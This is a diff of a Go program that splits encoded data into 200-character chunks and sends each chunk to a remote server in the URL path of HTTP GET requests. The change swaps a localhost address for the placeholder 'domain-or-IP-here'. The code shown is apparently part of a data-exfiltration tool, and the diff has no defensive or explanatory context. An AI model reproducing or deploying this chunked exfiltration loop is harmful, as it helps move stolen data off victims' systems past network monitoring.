@@ -29,7 +29,7 @@ func main() {
             sendme := encoded[int1:int2]
             length -= 200
             initializer += 1
-            dom := "http://127.0.0.1/" + sendme
+            dom := "http://domain-or-IP-here/" + sendme
 	    _,err := http.Get(dom)
              if err != nil{
 			fmt.Println(err)
@@ -40,7 +40,7 @@ func main() {
 
             if (length < 200){
               sendmefinal := encoded[int3:(int4-(length))]
-              mydom := "http://127.0.0.1/" + sendmefinal
+              mydom := "http://domain-or-IP-here/" + sendmefinal
               _,err := http.Get(mydom)
 	      if err != nil{
                         fmt.Println(err)
@@ -49,7 +49,7 @@ func main() {
               break
             }
             sendme2 := encoded[int3:int4]
-            dom2 := "http://127.0.0.1/" + sendme2
+            dom2 := "http://domain-or-IP-here/" + sendme2
             _,err := http.Get(dom2)
 	    if err != nil{
                         fmt.Println(err)
